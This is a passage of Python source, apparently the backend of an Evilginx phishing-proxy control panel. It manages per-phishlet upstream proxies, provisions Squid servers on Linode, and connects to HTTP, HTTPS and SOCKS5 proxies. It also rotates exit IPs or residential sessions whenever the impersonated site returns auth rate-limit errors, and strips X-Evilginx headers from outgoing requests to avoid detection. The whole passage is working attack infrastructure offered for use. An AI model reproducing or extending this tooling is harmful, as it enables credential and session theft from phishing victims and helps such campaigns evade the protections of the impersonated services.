            ))
        nid = _next_custom_id(s)
        proxies = list(s.get("proxies") or [])
        for rec in recs or []:
            key = (
                rec.get("ipv4") or "",
                int(rec.get("port") or 0),
                rec.get("squid_user") or "",
                (rec.get("proxy_type") or "http").lower(),
            )
            if not key[0] or key[1] < 1:
                skipped += 1
                continue
            if key in existing:
                skipped += 1
                continue
            ip = rec.get("ipv4") or ""
            port = int(rec.get("port"))
            label = "custom-%s-%s" % (ip.replace(".", "-"), port)
            proxies.append({
                "id": nid,
                "kind": "custom",
                "label": label,
                "region": rec.get("geo_cc") or "",
                "ipv4": ip,
                "port": port,
                "proxy_type": rec.get("proxy_type") or "http",
                "squid_user": rec.get("squid_user") or "",
                "squid_pass": rec.get("squid_pass") or "",
                "status": "active",
                "created": int(time.time()),
                "geo_city": rec.get("geo_city") or "",
                "geo_cc": rec.get("geo_cc") or "",
                "geo_region": rec.get("geo_region") or "",
            })
            existing.add(key)
            nid -= 1
            added += 1
        s["proxies"] = proxies
        save(s)
    if added:
        ensure_evilginx_sidecar_proxy()
    return added, skipped, public_state()


def _track_tunnel(px_id, *socks):
    rec = {"px_id": _as_id(px_id) if px_id is not None else None, "socks": socks}
    with _tunnels_lock:
        _tunnels.append(rec)
    return rec


def _untrack_tunnel(rec):
    if not rec:
        return
    with _tunnels_lock:
        try:
            _tunnels.remove(rec)
        except ValueError:
            pass


def drop_proxy_tunnels(linode_ids):
    """Force-close live sidecar CONNECT tunnels for these Linode ids.

    Evilginx reuses idle upstreams. Detach only updated JSON before; the
    Squid hop stayed up until idle timeout, so refresh still used the old IP.
    """
    drop = {_as_id(i) for i in (linode_ids or []) if i is not None}
    if not drop:
        return 0
    doomed = []
    with _tunnels_lock:
        keep = []
        for rec in _tunnels:
            if rec.get("px_id") in drop:
                doomed.append(rec)
            else:
                keep.append(rec)
        _tunnels[:] = keep
    for rec in doomed:
        for s in rec.get("socks") or []:
            if s is None:
                continue
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
    return len(doomed)


def pick_proxy(origin_host):
    s = load()
    pl = domain_to_phishlet(origin_host)
    if pl and _di_enabled(s, pl):
        chosen = _make_dataimpulse_proxy(pl, _di_cfg(s))
        if chosen:
            _note_use(chosen.get("id"), pl)
            return chosen
        return None
    ids = [_as_id(i) for i in (s.get("assignments") or {}).get(pl) or []]
    live = [p for p in s.get("proxies") or [] if _as_id(p.get("id")) in ids and p.get("status") == "active" and p.get("ipv4")]
    if not live:
        return None
    cur = _as_id((s.get("current") or {}).get(pl))
    chosen = None
    for p in live:
        if _as_id(p.get("id")) == cur:
            chosen = p
            break
    if chosen is None:
        s.setdefault("current", {})[pl] = live[0]["id"]
        save(s)
        chosen = live[0]
    if pl:
        _note_use(chosen.get("id"), pl)
    return chosen


def _used_slot(px_id, phishlet):
    rec = _used_mem.setdefault(str(_as_id(px_id)), {})
    slot = rec.setdefault(phishlet, {"hits": 0, "last": 0, "bytes_out": 0, "bytes_in": 0})
    slot.setdefault("hits", 0)
    slot.setdefault("last", 0)
    slot.setdefault("bytes_out", 0)
    slot.setdefault("bytes_in", 0)
    return slot


def _used_flush_loop():
    while True:
        time.sleep(5)
        try:
            _flush_used()
        except Exception:
            pass


def _flush_used():
    """Persist counters to disk. Never called from the CONNECT pump."""
    global _used_dirty
    with _used_lock:
        if not _used_dirty:
            return
        snap = json.loads(json.dumps(_used_mem))
        _used_dirty = False
    with _lock:
        s = load()
        s["used_by"] = snap
        save(s)


def _note_use(px_id, phishlet):
    global _used_dirty
    if not px_id or not phishlet:
        return
    with _used_lock:
        slot = _used_slot(px_id, phishlet)
        slot["hits"] = int(slot.get("hits") or 0) + 1
        slot["last"] = int(time.time())
        _used_dirty = True


def _add_bytes(px_id, phishlet, n_out=0, n_in=0):
    global _used_dirty
    if not px_id or not phishlet:
        return
    n_out = int(n_out or 0)
    n_in = int(n_in or 0)
    if n_out <= 0 and n_in <= 0:
        return
    with _used_lock:
        slot = _used_slot(px_id, phishlet)
        slot["bytes_out"] = int(slot.get("bytes_out") or 0) + n_out
        slot["bytes_in"] = int(slot.get("bytes_in") or 0) + n_in
        slot["last"] = int(time.time())
        _used_dirty = True


def _live_assigned_ids(s, assigned):
    live = []
    for i in assigned or []:
        rec = next((p for p in s.get("proxies") or [] if _as_id(p.get("id")) == i), None)
        if rec and rec.get("status") == "active" and rec.get("ipv4"):
            live.append(i)
    return live


def record_auth_429(phishlet, host="", path=""):
    """Origin HTTP 429 from the evilginx hook. Never destroys a Linode.

    Carousel ON (per phishlet): after HIT_LIMIT, current hop goes to the end of
    the assignment queue and stays assigned; traffic switches to the next live hop.
    Carousel OFF: ignore — keep the assigned hop(s). Do not detach, rotate, or
    fall back to the Evilginx server IP.
    """
    with _lock:
        s = load()
        pl = phishlet or domain_to_phishlet(host)
        if not pl:
            return {"ok": True, "ignored": True}
        if _di_enabled(s, pl):
            # Auth 429 on residential → burn sticky sessid so the next visit gets a new IP.
            old = None
            with _di_lock:
                slot = _di_runtime.get(pl) or {}
                old = slot.get("sessid")
            new = _di_sessid_for(pl, rotate=True)
            print("[sidecar] di rotate on 429 pl=%s %s -> %s" % (pl, old, new), flush=True)
            return {"ok": True, "rotated": True, "reason": "dataimpulse", "sessid": new}
        if not bool((s.get("carousel") or {}).get(pl)):
            return {"ok": True, "ignored": True, "reason": "carousel off"}
        px_id = _as_id((s.get("current") or {}).get(pl))
        rec = next((p for p in s.get("proxies") or [] if _as_id(p.get("id")) == px_id), None)
        if not rec or rec.get("status") != "active":
            return {"ok": True, "ignored": True, "reason": "current proxy not live"}
        now = time.time()
        key = f"{pl}:{px_id}"
        hits = [t for t in (s.get("hits") or {}).get(key, []) if now - t < HIT_WINDOW]
        hits.append(now)
        s.setdefault("hits", {})[key] = hits
        save(s)
        if len(hits) < HIT_LIMIT:
            return {"ok": True, "hits": len(hits), "limit": HIT_LIMIT}

        assigned = [_as_id(i) for i in (s.get("assignments") or {}).get(pl) or []]
        ip = rec.get("ipv4") or str(px_id)

        if px_id in assigned:
            assigned = [i for i in assigned if i != px_id] + [px_id]
        s.setdefault("assignments", {})[pl] = assigned
        live = _live_assigned_ids(s, assigned)
        nxt = next((i for i in live if i != px_id), None)
        if nxt is None:
            nxt = live[0] if live else None
        s.setdefault("current", {})[pl] = nxt
        s["hits"][key] = []
        save(s)
        if nxt and nxt != px_id:
            drop_proxy_tunnels([px_id])
        nxtp = next((p for p in s["proxies"] if _as_id(p.get("id")) == nxt), None) if nxt else None
        nxt_ip = (nxtp or {}).get("ipv4") or nxt
        if _notify:
            if nxt and nxt != px_id:
                _notify(
                    "Proxy carousel",
                    f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. Moved to end of queue (still assigned). Now using {nxt_ip}.",
                    "warning",
                )
            elif nxt == px_id:
                _notify(
                    "Proxy carousel",
                    f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. No other live hop in the queue — staying on {ip}.",
                    "warning",
                )
            else:
                _notify(
                    "Proxy pool empty",
                    f"Phishlet {pl}: no live assigned proxies. Traffic uses the Evilginx server IP.",
                    "error",
                )
        return {"ok": True, "rotated": True, "carousel": True, "detached": None, "previous": px_id, "next": nxt}


def ensure_evilginx_sidecar_proxy():
    """Point Evilginx built-in proxy at local sidecar. Caller restarts evilginx."""
    if not _egx_config_path or not os.path.isfile(_egx_config_path):
        return
    try:
        cfg = json.load(open(_egx_config_path))
    except Exception:
        return
    cfg["proxy"] = {
        "type": "http",
        "address": "127.0.0.1",
        "port": SIDECAR_PORT,
        "username": "",
        "password": "",
        "enabled": True,
    }
    with open(_egx_config_path, "w") as f:
        json.dump(cfg, f, indent=2)


def public_state():
    s = load()
    assigned_rev = {}
    for pl, ids in (s.get("assignments") or {}).items():
        for i in ids or []:
            assigned_rev.setdefault(_as_id(i), []).append(pl)
    proxies = []
    for p in s.get("proxies") or []:
        q = dict(p)
        q.pop("squid_pass", None)
        q.pop("root_pass", None)
        q["squid_user"] = p.get("squid_user") or ""
        q["kind"] = p.get("kind") or "linode"
        q["proxy_type"] = p.get("proxy_type") or "http"
        q["geo_city"] = p.get("geo_city") or ""
        q["geo_cc"] = p.get("geo_cc") or ""
        q["geo_region"] = p.get("geo_region") or ""
        port = int(p.get("port") or SQUID_PORT)
        q["port"] = port
        q["endpoint"] = f"{p.get('ipv4')}:{port}" if p.get("ipv4") else ""
        q["ready"] = p.get("status") == "active"
        pid = _as_id(p.get("id"))
        q["id"] = pid
        q["assigned_phishlets"] = list(assigned_rev.get(pid) or [])
        with _used_lock:
            used = (
                _used_mem.get(str(pid))
                or _used_mem.get(str(p.get("id")))
                or (s.get("used_by") or {}).get(str(pid))
                or (s.get("used_by") or {}).get(str(p.get("id")))
                or {}
            )
            q["used_by"] = json.loads(json.dumps(used))
        proxies.append(q)
    return {
        "configured": bool(s.get("api_key")),
        "proxies": proxies,
        "assignments": s.get("assignments") or {},
        "current": s.get("current") or {},
        "carousel": s.get("carousel") or {},
        "deploy": s.get("deploy") or {},
        "manual_install": _mi_public(s, include_line=False),
        "allow_ip": public_ipv4(),
        "plan": PLAN,
        "image": IMAGE,
        "dataimpulse": dataimpulse_public(s),
    }


def live_snapshot():
    """RAM snapshot for the panel UI. No Linode API, no Evilginx, no disk I/O on the hot path."""
    s = load()
    with _used_lock:
        used = json.loads(json.dumps(_used_mem or s.get("used_by") or {}))
    slim = []
    for p in s.get("proxies") or []:
        slim.append({
            "id": _as_id(p.get("id")),
            "ipv4": p.get("ipv4") or "",
            "label": p.get("label") or "",
            "status": p.get("status") or "",
            "kind": p.get("kind") or "linode",
            "proxy_type": p.get("proxy_type") or "http",
        })
    di = dataimpulse_public(s)
    return {
        "used_by": used,
        "assignments": s.get("assignments") or {},
        "current": s.get("current") or {},
        "carousel": s.get("carousel") or {},
        "proxies": slim,
        "deploy_running": bool((s.get("deploy") or {}).get("running")),
        "dataimpulse": di,
    }


def live_fingerprint(snap):
    parts = []
    for pid, rec in sorted((snap.get("used_by") or {}).items(), key=lambda x: str(x[0])):
        for pl, sl in sorted((rec or {}).items(), key=lambda x: str(x[0])):
            sl = sl or {}
            parts.append(
                f"{pid}:{pl}:{int(sl.get('hits') or 0)}:{int(sl.get('bytes_out') or 0)}:{int(sl.get('bytes_in') or 0)}"
            )
    parts.append(json.dumps(snap.get("assignments") or {}, sort_keys=True, separators=(",", ":")))
    parts.append(json.dumps(snap.get("current") or {}, sort_keys=True, separators=(",", ":")))
    parts.append(json.dumps({k: bool(v) for k, v in (snap.get("carousel") or {}).items()}, sort_keys=True, separators=(",", ":")))
    parts.append(",".join(str(p.get("id")) for p in snap.get("proxies") or []))
    di = snap.get("dataimpulse") or {}
    parts.append(json.dumps(di.get("enabled") or {}, sort_keys=True, separators=(",", ":")))
    parts.append(json.dumps(di.get("runtime") or {}, sort_keys=True, separators=(",", ":")))
    return "|".join(parts)


def set_carousel(phishlet, enabled):
    """Per-phishlet 429 mode: True = round-robin. False = 429 does not rotate."""
    with _lock:
        s = load()
        s.setdefault("carousel", {})[phishlet] = bool(enabled)
        save(s)
    return public_state()


def assign(phishlet, linode_ids):
    raw = [_as_id(i) for i in (linode_ids or [])]
    if DI_PROXY_ID in raw:
        return set_dataimpulse(phishlet, True)
    with _lock:
        s = load()
        ids = []
        known = {_as_id(p.get("id")) for p in s.get("proxies") or []}
        for i in raw:
            if i in known:
                ids.append(i)
        s.setdefault("assignments", {})[phishlet] = ids
        if ids:
            cur = _as_id((s.get("current") or {}).get(phishlet))
            if cur not in ids:
                s.setdefault("current", {})[phishlet] = ids[0]
            # Linode/custom assign wins over DataImpulse for this phishlet.
            di = _di_cfg(s)
            if (di.get("enabled") or {}).get(phishlet):
                di.setdefault("enabled", {})[phishlet] = False
                s["dataimpulse"] = di
        else:
            s.setdefault("current", {})[phishlet] = None
        save(s)
    if ids:
        drop_proxy_tunnels([DI_PROXY_ID])
        with _di_lock:
            _di_runtime.pop(phishlet, None)
    ensure_evilginx_sidecar_proxy()
    return public_state()


def detach(phishlet, linode_ids):
    drop = set()
    for i in linode_ids or []:
        drop.add(_as_id(i))
    di_off = DI_PROXY_ID in drop
    drop.discard(DI_PROXY_ID)
    with _lock:
        s = load()
        if not drop and not di_off:
            di = _di_cfg(s)
            if (di.get("enabled") or {}).get(phishlet):
                di_off = True
        assigned = [_as_id(i) for i in (s.get("assignments") or {}).get(phishlet) or [] if _as_id(i) not in drop]
        s.setdefault("assignments", {})[phishlet] = assigned
        cur = _as_id((s.get("current") or {}).get(phishlet))
        if cur in drop or cur not in assigned:
            s.setdefault("current", {})[phishlet] = assigned[0] if assigned else None
        if di_off:
            di = _di_cfg(s)
            di.setdefault("enabled", {})[phishlet] = False
            s["dataimpulse"] = di
        save(s)
    # Kill live CONNECT tunnels through the detached Squid(s). Otherwise Evilginx
    # keeps the idle upstream and refresh still exits via the old proxy IP.
    drop_proxy_tunnels(drop)
    if di_off:
        drop_proxy_tunnels([DI_PROXY_ID])
        with _di_lock:
            _di_runtime.pop(phishlet, None)
        if _notify:
            _notify("DataImpulse off", "%s: residential gateway detached." % phishlet, "info")
        ensure_evilginx_sidecar_proxy()
    return public_state()


def destroy_instance(linode_id):
    """User-clicked destroy only. Never called from deploy/health checks."""
    s = load()
    lid = _as_id(linode_id)
    rec = next((p for p in s.get("proxies") or [] if _as_id(p.get("id")) == lid), None)
    if not rec:
        raise RuntimeError("refusing to delete: instance is not a panel proxy")
    custom = _is_custom(rec)
    if not custom:
        linode("DELETE", f"/linode/instances/{lid}")
    s["proxies"] = [p for p in s.get("proxies") or [] if _as_id(p.get("id")) != lid]
    for pl, ids in list((s.get("assignments") or {}).items()):
        s["assignments"][pl] = [i for i in ids if _as_id(i) != lid]
        if _as_id((s.get("current") or {}).get(pl)) == lid:
            s["current"][pl] = (s["assignments"][pl][0] if s["assignments"][pl] else None)
    save(s)
    drop_proxy_tunnels([lid])
    if _notify:
        if custom:
            _notify("Custom proxy removed", f"{rec.get('ipv4') or lid} deleted by user.", "info")
        else:
            _notify("Proxy destroyed", f"Linode {lid} deleted by user.", "info")
    return public_state()


def _known_proxy(linode_id):
    lid = _as_id(linode_id)
    rec = next((p for p in (load().get("proxies") or []) if _as_id(p.get("id")) == lid), None)
    if not rec:
        raise RuntimeError("instance is not a panel proxy")
    return rec


def power_instance(linode_id, action):
    """Start / stop / restart a panel proxy Linode. Never deletes it."""
    rec = _known_proxy(linode_id)
    if _is_custom(rec):
        raise RuntimeError("custom proxy has no start/stop/restart")
    lid = rec["id"]
    action = (action or "").strip().lower()
    if action not in ("start", "stop", "restart"):
        raise RuntimeError("action must be start, stop or restart")
    label = rec.get("label") or f"proxy-{lid}"

    def _ok_already(err):
        msg = str(err).lower()
        return any(x in msg for x in ("already running", "already offline", "linode is not running", "busy"))

    try:
        if action == "start":
            try:
                linode("POST", f"/linode/instances/{lid}/boot")
            except RuntimeError as e:
                if not _ok_already(e):
                    raise
            _patch_proxy(lid, status="booting")
        elif action == "stop":
            try:
                linode("POST", f"/linode/instances/{lid}/shutdown")
            except RuntimeError as e:
                if not _ok_already(e):
                    raise
            _patch_proxy(lid, status="stopped")
        else:
            try:
                linode("POST", f"/linode/instances/{lid}/reboot")
            except RuntimeError as e:
                if "not running" in str(e).lower() or "offline" in str(e).lower():
                    linode("POST", f"/linode/instances/{lid}/boot")
                elif not _ok_already(e):
                    raise
            _patch_proxy(lid, status="rebooting")
    except RuntimeError:
        raise

    if _notify:
        titles = {"start": "Proxy start", "stop": "Proxy stop", "restart": "Proxy restart"}
        msgs = {
            "start": f"{label} booting.",
            "stop": f"{label} shutting down. Traffic skips this node until Start.",
            "restart": f"{label} rebooting.",
        }
        ntype = "warning" if action == "stop" else "progress"
        _notify(titles[action], msgs[action], ntype)

    threading.Thread(target=_power_followup, args=(lid, action, label), daemon=True).start()
    return public_state()


def _power_followup(lid, action, label):
    try:
        if action == "stop":
            _wait_status(lid, "offline", 180)
            _patch_proxy(lid, status="stopped")
            if _notify:
                _notify("Proxy stopped", f"{label} is offline.", "info")
            return
        info = _wait_running(lid, 300)
        ipv4 = (info.get("ipv4") or [None])[0]
        kw = {"status": "active" if info.get("status") == "running" else (info.get("status") or "unknown")}
        if ipv4:
            kw["ipv4"] = ipv4
        _patch_proxy(lid, **kw)
        if _notify:
            _notify("Proxy " + action, f"{label} is running.", "success")
    except Exception as e:
        if _notify:
            _notify("Proxy power error", f"{label}: {e}", "error")


def instance_metrics(linode_id, with_stats=True):
    if _is_custom_id(linode_id):
        return {"id": _as_id(linode_id)}
    try:
        st = linode("GET", f"/linode/instances/{linode_id}")
        stats = {}
        if with_stats:
            try:
                stats = linode("GET", f"/linode/instances/{linode_id}/stats")
            except Exception:
                stats = {}
        cpu = 0
        net_in = 0
        net_out = 0
        data = (stats.get("data") or stats)
        if isinstance(data.get("cpu"), list) and data["cpu"]:
            last = data["cpu"][-1]
            cpu = last[1] if isinstance(last, list) and len(last) > 1 else 0
        nv = data.get("netv4") or {}
        if isinstance(nv.get("in"), list) and nv["in"]:
            last = nv["in"][-1]
            net_in = last[1] if isinstance(last, list) and len(last) > 1 else 0
        if isinstance(nv.get("out"), list) and nv["out"]:
            last = nv["out"][-1]
            net_out = last[1] if isinstance(last, list) and len(last) > 1 else 0
        ipv4 = st.get("ipv4") or []
        return {
            "id": linode_id,
            "linode_status": st.get("status"),
            "label": st.get("label"),
            "region": st.get("region"),
            "ipv4": ipv4[0] if ipv4 else "",
            "cpu": round(float(cpu or 0), 1),
            "net_in": net_in,
            "net_out": net_out,
            "type": st.get("type"),
        }
    except Exception as e:
        return {"id": linode_id, "error": str(e)}


def _set_deploy(s, **kw):
    d = s.setdefault("deploy", {})
    d.update(kw)
    save(s)


def deploy_async(count, regions, restart_egx):
    t = threading.Thread(target=_deploy_worker, args=(int(count), list(regions), restart_egx), daemon=True)
    t.start()


def _wait_running(lid, timeout=240):
    t0 = time.time()
    while time.time() - t0 < timeout:
        info = linode("GET", f"/linode/instances/{lid}")
        if info.get("status") == "running" and info.get("ipv4"):
            return info
        time.sleep(5)
    return linode("GET", f"/linode/instances/{lid}")


def _squid_up(ip, user, password, timeout=180):
    t0 = time.time()
    token = base64.b64encode(f"{user}:{password}".encode()).decode()
    while time.time() - t0 < timeout:
        try:
            s = socket.create_connection((ip, SQUID_PORT), 8)
            s.sendall(
                f"CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\nProxy-Authorization: Basic {token}\r\n\r\n".encode()
            )
            s.settimeout(8)
            buf = s.recv(256)
            s.close()
            if buf.startswith(b"HTTP/1.") and b" 407" not in buf[:40]:
                return True
        except Exception:
            time.sleep(6)
    return False


def _patch_proxy(lid, **kw):
    lid = _as_id(lid)
    with _lock:
        s = load()
        for p in s.get("proxies") or []:
            if _as_id(p.get("id")) == lid:
                p.update(kw)
                break
        save(s)


def _wait_status(lid, want, timeout=180):
    t0 = time.time()
    info = {}
    while time.time() - t0 < timeout:
        info = linode("GET", f"/linode/instances/{lid}")
        if info.get("status") == want:
            return info
        time.sleep(4)
    return info


def _finish_one(rec, allow_ip, report=None):
    lid = rec["id"]
    label = rec.get("label") or str(lid)
    root = rec.get("root_pass") or ""
    user, pw = rec.get("squid_user"), rec.get("squid_pass")

    def go(pct, msg):
        if report:
            report(lid, pct, msg)

    go(8, f"{label}: waiting Linode running")
    info = _wait_running(lid, timeout=360)
    ipv4 = (info.get("ipv4") or [rec.get("ipv4")])[0]
    _patch_proxy(lid, ipv4=ipv4, status="installing")
    if not ipv4:
        _patch_proxy(lid, status="failed")
        return False, "no ipv4 after boot"

    go(18, f"{label}: waiting SSH")

    def on_tick(elapsed, phase):
        if phase == "cloud-init":
            go(22 + min(40, elapsed // 8), f"{label}: cloud-init {elapsed}s")
        elif phase == "apt":
            go(64, f"{label}: waiting apt idle")
        else:
            go(70, f"{label}: settle 5s")

    ok_boot, err_boot = _wait_guest_ready(ipv4, root, timeout=540, on_tick=on_tick)
    if not ok_boot:
        _patch_proxy(lid, status="failed")
        return False, err_boot

    go(74, f"{label}: checking squid")
    if user and pw and _squid_up(ipv4, user, pw, timeout=25):
        go(100, f"{label}: squid ready")
        _patch_proxy(lid, status="active")
        return True, ""

    go(80, f"{label}: installing squid")
    ok, err = _install_squid(ipv4, root, user, pw, allow_ip)
    go(100 if ok else 90, f"{label}: squid {'ready' if ok else 'failed'}")
    _patch_proxy(lid, status="active" if ok else "failed")
    return ok, err


def _deploy_worker(count, regions, restart_egx):
    s = load()
    if s.get("deploy", {}).get("running"):
        return
    if count < 1:
        _set_deploy(s, running=False, error="count must be >= 1", pct=0)
        return
    if not regions:
        _set_deploy(s, running=False, error="pick at least one region", pct=0)
        return
    if len(regions) > count:
        _set_deploy(s, running=False, error="regions cannot exceed server count", pct=0)
        return
    allow_ip = public_ipv4()
    if not allow_ip:
        _set_deploy(s, running=False, error="cannot detect Evilginx public IP", pct=0)
        return
    _set_deploy(s, running=True, error="", pct=2, step="creating all servers")
    if _notify:
        _notify("Proxy deploy started", f"Creating {count} Nanode 1GB in parallel ({', '.join(regions)}).", "progress")
    recs = []
    try:
        pubkey = _panel_pubkey()
        for i in range(count):
            region = regions[i % len(regions)]
            user, pw = _rand_user(), _rand_pass()
            root = _rand_pass()
            label = "egx-px-" + secrets.token_hex(3)
            body = {
                "type": PLAN,
                "region": region,
                "image": IMAGE,
                "label": label,
                "root_pass": root,
                "tags": [TAG],
                "booted": True,
                "authorized_keys": [pubkey] if pubkey else None,
                "metadata": {"user_data": base64.b64encode(_cloud_init(user, pw, allow_ip).encode()).decode()},
            }
            if not body["authorized_keys"]:
                body.pop("authorized_keys")
            inst = linode("POST", "/linode/instances", body)
            lid = inst.get("id")
            rec = {
                "id": lid,
                "label": label,
                "region": region,
                "ipv4": (inst.get("ipv4") or [None])[0] or "",
                "squid_user": user,
                "squid_pass": pw,
                "root_pass": root,
                "port": SQUID_PORT,
                "status": "provisioning",
                "created": int(time.time()),
            }
            s = load()
            s.setdefault("proxies", []).append(rec)
            save(s)
            recs.append(rec)
            _set_deploy(load(), running=True, pct=int(4 + (i + 1) / count * 16), step=f"created {i+1}/{count} {label}", error="")
        _set_deploy(load(), running=True, pct=22, step=f"boot + cloud-init + squid on {len(recs)} server(s)", error="")
        results = [None] * len(recs)
        prog = {}
        plock = threading.Lock()
        n = max(1, len(recs))

        def _report(lid, pct, msg):
            with plock:
                prog[lid] = max(0, min(100, int(pct)))
                avg = sum(prog.get(r["id"], 0) for r in recs) / n
                overall = 22 + int(avg * 0.76)
                _set_deploy(load(), running=True, pct=min(98, overall), step=msg, error="")

        def _job(idx, rec):
            results[idx] = _finish_one(rec, allow_ip, report=_report)

        threads = [threading.Thread(target=_job, args=(i, rec), daemon=True) for i, rec in enumerate(recs)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        failed = 0
        for rec, res in zip(recs, results):
            ok, err = res if res else (False, "no result")
            if not ok:
                failed += 1
                if _notify:
                    _notify("Proxy install failed", f"{rec.get('label')} ({rec.get('ipv4')}): {err}. Instance was NOT deleted — use Repair or Destroy.", "warning")
        ensure_evilginx_sidecar_proxy()
        if restart_egx:
            try:
                restart_egx()
            except Exception:
                pass
        _set_deploy(load(), running=False, pct=100, step="done", error="")
        if _notify:
            _notify("Proxy deploy finished", f"{len(recs)} instance(s) created, {failed} squid-failed (kept). Assign only Active ones.", "success")
    except Exception as e:
        _set_deploy(load(), running=False, pct=0, step="error", error=str(e))
        if _notify:
            _notify("Proxy deploy error", str(e), "error")


def _repair_install(rec, ip, root, allow_ip):
    user, pw = rec.get("squid_user"), rec.get("squid_pass")
    ok_boot, err_boot = _wait_guest_ready(ip, root, timeout=540)
    if not ok_boot:
        return False, err_boot
    if user and pw and _squid_up(ip, user, pw, timeout=25):
        return True, ""
    return _install_squid(ip, root, user, pw, allow_ip)


def repair_instance(linode_id):
    """Install squid on an existing Nanode. Never deletes it. May reboot if SSH key/password is missing."""
    s = load()
    rec = next((p for p in s.get("proxies") or [] if _as_id(p.get("id")) == _as_id(linode_id)), None)
    if not rec:
        raise RuntimeError("instance is not a panel proxy")
    if _is_custom(rec):
        raise RuntimeError("custom proxy cannot be repaired")
    allow_ip = public_ipv4()
    lid = rec["id"]
    ip = rec.get("ipv4") or ""
    label = rec.get("label") or str(lid)
    _patch_proxy(lid, status="installing")
    if rec.get("squid_user") and rec.get("squid_pass") and ip and _squid_up(ip, rec["squid_user"], rec["squid_pass"], timeout=8):
        _patch_proxy(lid, status="active")
        return public_state()
    root = rec.get("root_pass") or ""
    if ip and root:
        ok, err = _repair_install(rec, ip, root, allow_ip)
        if ok:
            _patch_proxy(lid, status="active")
            if _notify:
                _notify("Proxy repaired", f"{label} ({ip}) squid is up.", "success")
            return public_state()
    if _notify:
        _notify("Proxy repair reboot", f"{label}: resetting SSH access (power cycle, instance kept) then installing squid.", "progress")
    linode("POST", f"/linode/instances/{lid}/shutdown")
    _wait_status(lid, "offline", 180)
    root = _rand_pass()
    linode("POST", f"/linode/instances/{lid}/password", {"root_pass": root})
    _patch_proxy(lid, root_pass=root)
    linode("POST", f"/linode/instances/{lid}/boot")
    info = _wait_running(lid, 360)
    ip = (info.get("ipv4") or [ip])[0]
    _patch_proxy(lid, ipv4=ip, root_pass=root, status="installing")
    ok, err = _repair_install(rec, ip, root, allow_ip)
    _patch_proxy(lid, status="active" if ok else "failed")
    if _notify:
        if ok:
            _notify("Proxy repaired", f"{label} ({ip}) squid is up.", "success")
        else:
            _notify("Proxy repair failed", f"{label} ({ip}): {err}. Instance was NOT deleted.", "error")
    return public_state()


def repair_async(linode_id):
    t = threading.Thread(target=repair_instance, args=(int(linode_id),), daemon=True)
    t.start()


def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        ch = sock.recv(n - len(buf))
        if not ch:
            raise RuntimeError("proxy closed")
        buf += ch
    return buf


def _http_connect_via(sock, host, port, user, password):
    hdr = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
    if user or password:
        token = base64.b64encode(f"{user}:{password}".encode()).decode()
        hdr += f"Proxy-Authorization: Basic {token}\r\n"
    sock.sendall((hdr + "\r\n").encode())
    rbuf = b""
    sock.settimeout(15)
    while b"\r\n\r\n" not in rbuf:
        ch = sock.recv(4096)
        if not ch:
            break
        rbuf += ch
    if b" 200" not in rbuf.split(b"\r\n", 1)[0]:
        raise RuntimeError("proxy CONNECT failed")


def _socks5_connect(sock, host, port, user, password, remote_dns):
    if user or password:
        sock.sendall(b"\x05\x02\x00\x02")
    else:
        sock.sendall(b"\x05\x01\x00")
    greet = _recv_exact(sock, 2)
    if greet[0] != 5:
        raise RuntimeError("not SOCKS5")
    method = greet[1]
    if method == 2:
        u = (user or "").encode("utf-8")[:255]
        p = (password or "").encode("utf-8")[:255]
        sock.sendall(b"\x01" + bytes([len(u)]) + u + bytes([len(p)]) + p)
        auth = _recv_exact(sock, 2)
        if auth[1] != 0:
            raise RuntimeError("SOCKS5 auth failed")
    elif method != 0:
        raise RuntimeError("SOCKS5 method rejected")
    dst_port = struct.pack("!H", int(port))
    if remote_dns:
        hb = host.encode("idna")[:255]
        req = b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + dst_port
    else:
        try:
            packed = socket.inet_aton(host)
            req = b"\x05\x01\x00\x01" + packed + dst_port
        except OSError:
            info = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
            fam, _, _, _, sa = info[0]
            if fam == socket.AF_INET6:
                req = b"\x05\x01\x00\x04" + socket.inet_pton(socket.AF_INET6, sa[0]) + dst_port
            else:
                req = b"\x05\x01\x00\x01" + socket.inet_aton(sa[0]) + dst_port
    sock.sendall(req)
    head = _recv_exact(sock, 4)
    if head[0] != 5 or head[1] != 0:
        raise RuntimeError("SOCKS5 connect failed")
    atyp = head[3]
    if atyp == 1:
        _recv_exact(sock, 4 + 2)
    elif atyp == 4:
        _recv_exact(sock, 16 + 2)
    elif atyp == 3:
        ln = _recv_exact(sock, 1)[0]
        _recv_exact(sock, ln + 2)
    else:
        raise RuntimeError("SOCKS5 bad address")


def _upstream_connect(px, host, port):
    """Open a tunnel through a Linode Squid hop, custom proxy, or DataImpulse gateway."""
    ip = px.get("ipv4") or ""
    pport = int(px.get("port") or SQUID_PORT)
    user = px.get("squid_user") or ""
    password = px.get("squid_pass") or ""
    ptype = (px.get("proxy_type") or "http").strip().lower()
    kind = (px.get("kind") or "").strip().lower()
    if kind not in ("custom", "dataimpulse") and not _is_custom(px):
        ptype = "http"
    if kind == "dataimpulse":
        ptype = "http"
    remote = socket.create_connection((ip, pport), 12)
    remote.settimeout(15)
    try:
        if ptype == "https":
            ctx = ssl._create_unverified_context()
            remote = ctx.wrap_socket(remote, server_hostname=ip)
            _http_connect_via(remote, host, port, user, password)
        elif ptype in ("socks5", "socks5h"):
            _socks5_connect(remote, host, port, user, password, remote_dns=(ptype == "socks5h"))
        else:
            _http_connect_via(remote, host, port, user, password)
    except Exception:
        try:
            remote.close()
        except Exception:
            pass
        raise
    return remote


_cert_lock = threading.Lock()
_cert_cache = {}
_XEG_HDR = re.compile(br"(?i)\r\nX-Evilginx[^\r\n]*")


_REQ_START = re.compile(br"^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS) ")


def _strip_evilginx_headers(data):
    if not data:
        return data
    if b"x-evilginx" in data.lower():
        data = _XEG_HDR.sub(b"", data)
    return data


def _rewrite_origin_request(buf):
    """Drop X-Evilginx and force Connection: close on complete HTTP requests.

    Returns (bytes_to_send, leftover). Incomplete headers stay in leftover.
    """
    if b"\r\n\r\n" not in buf:
